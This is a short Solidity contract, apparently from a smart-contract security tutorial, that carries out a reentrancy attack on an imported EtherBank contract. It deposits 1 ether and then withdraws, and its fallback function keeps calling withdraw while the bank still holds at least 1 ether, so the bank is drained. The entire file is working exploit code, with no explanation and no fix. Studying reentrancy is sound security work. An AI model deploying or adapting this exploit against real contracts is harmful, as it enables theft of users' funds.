// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import {EtherBank} from "./etherBank.sol";

contract ReentrancyAttack{
    EtherBank public etherBank;
    constructor(address _contractAddress){
        etherBank = EtherBank(_contractAddress);
    }
    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherBank).balance >= 1 ether) {
            etherBank.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        etherBank.deposit{value:1 ether}();
        etherBank.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}